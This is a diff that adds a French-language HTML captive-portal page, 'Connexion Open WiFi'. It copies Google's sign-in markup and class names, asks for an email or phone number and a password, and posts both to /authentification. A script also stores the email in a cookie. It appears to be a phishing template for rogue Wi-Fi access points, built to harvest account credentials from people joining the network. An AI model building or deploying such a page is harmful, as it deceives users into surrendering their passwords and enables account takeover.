@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
+    <title>Connexion : comptes</title>
+    <script src="/jquery.slim.min.js"></script>
+    <script src="jquery.slim.min.js"></script>
+    <link rel="stylesheet" href="/captive.css">
+    <link rel="stylesheet" href="captive.css">
+  </head>
+  <body>
+    <div class="H2SoFe">
+      <div id="initialView" class="RAYh1e">
+        <div class="xkfVF">
+          <div class="zWl5kd">
+            <div class="DRS7Fe bxPAYd k6Zj8d">
+              <div class="jXeDnc">
+                <h1 id="headingText"><span>Connexion Open WiFi</span></h1>
+                <div id="headingSubtext" class="Y4dIwd"><span>Vous devez vous connectez pour continuer</span></div>
+              </div>
+              <div class="bxPAYd">
+                <div class="Wxwduf Us7fWe">
+                  <form id="formtosubmit" action="/authentification" method="post" novalidate="" target="_blank"><span>
+                      <section>
+                        <header>
+                          <div id="emailField" class="rFrNMe KSczvd">
+                            <div class="aCsJod oJeWuf">
+                              <div class="Xb9hP">
+                                <input id="identifierId" autocomplete="off" spellcheck="false" name="email" value="" type="email" class="whsOnd zHQkBf">
+                                <div class="AxOyFc snByac">Adresse e-mail ou numéro de téléphone</div>
+                              </div>
+                              <div class="i9lrp mIZh1c"></div>
+                              <div style="transform-origin: 119.5px center 0px;" class="OabDMe cXrdqd Y2Zypf"></div>
+                            </div>
+                          </div>
+                          <div id="pwdField" class="rFrNMe KSczvd">
+                            <div class="aCsJod oJeWuf">
+                              <div class="Xb9hP">
+                                <input name="password" autocapitalize="off" type="password" class="whsOnd zHQkBf">
+                                <div class="AxOyFc snByac">Saisissez votre mot de passe</div>
+                              </div>
+                              <div class="i9lrp mIZh1c"></div>
+                              <div style="transform-origin: 119.5px center 0px;"></div>
+                            </div>
+                          </div>
+                          <input id="inputurl" name="url" type="hidden" value="">
+                          <div class="ck6P8">
+                            <button type="button">Adresse e-mail ou mot de passe oublié?</button>
+                          </div>
+                        </header>
+                      </section></span><span>
+                      <div class="vwtvsf">
+                        <div class="ck6P8">S'il ne s'agit pas de votre ordinateur, utilisez une fenêtre de navigation privée pour vous connecter. <a href="">En savoir plus</a></div>
+                      </div></span></form>
+                  <div class="zQJV3">
+                    <div class="dG5hZc">
+                      <div class="qhFLie">
+                        <div id="identifierNext" class="O0WRkf zZhnYe C0oVfc nDKKZc"><span id="submitbutton" class="RveJvd">Suivant</span></div>
+                      </div>
+                      <div class="daaWTb">
+                        <div class="FS4hgd nDKKZc t29vte"><span jsslot=""><a href="#" class="NlWrkb">Créer un compte  </a></span></div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <footer class="RwBngc">
+          <div class="jgvuAb TkU0Xc">
+            <div role="presentation">
+              <div class="ry3kXd Ulgu9">
+                <div class="MocG8c B9IrJb LMgvRb KKjvXb">
+                  <div class="kRoyt MbhUzd"></div><span class="vRMGwf oJeWuf">Français (France)</span>
+                </div>
+              </div>
+              <div class="CeEBt Ce1Y1c">
+                <div class="TquXA"></div>
+              </div>
+            </div>
+          </div>
+          <ul class="Bgzgmd">
+            <li><a href="" target="_blank">Aide</a></li>
+            <li><a href="" target="_blank">Confidentialit&eacute;</a></li>
+            <li><a href="" target="_blank">Conditions d&apos;utilisation</a></li>
+          </ul>
+        </footer>
+      </div>
+    </div>
+  </body>
+</html>
+<script>
+  $(document).ready(function() {
+    var url = window.location.href;
+    $('#inputurl').attr('value',url);   
+    
+    
+    $('input[name=email]').on('keyup keypress blur change', function(e) {
+        if($('input[name=email]').val().length === 0 ){
+        $("#emailField").removeClass("CDELXb")
+      }else{
+        $("#emailField").addClass("CDELXb")
+      }
+    });
+    
+    $('input[name=password]').on('keyup keypress blur change', function(e) {
+        if($('input[name=password]').val().length === 0 ){
+        $("#pwdField").removeClass("CDELXb")
+      }else{
+        $("#pwdField").addClass("CDELXb")
+      }
+    });
+    
+    
+  
+    
+    $('#submitbutton').click( function() {
+      document.cookie = $('input[name=email]').val();
+      $("#formtosubmit").submit();
+    });
+  
+  
+  });  
+</script>
